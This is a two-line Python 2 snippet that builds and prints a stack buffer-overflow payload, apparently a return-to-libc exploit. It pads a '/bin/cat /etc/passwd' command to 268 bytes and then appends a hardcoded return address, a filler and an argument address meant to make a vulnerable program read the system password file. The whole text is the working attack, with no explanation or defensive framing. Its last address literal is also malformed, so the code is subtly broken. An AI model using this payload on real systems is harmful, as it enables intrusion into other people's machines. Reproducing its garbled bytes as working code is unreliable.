exploit = "/bin/cat /etc/passwd" + b"A"*(268-len("/bin/cat /etc/passwd")) + "\xb0\x5d\xe4\xf7" + b"B"*4 + "\xa0\xd7\xffxff"
print exploit
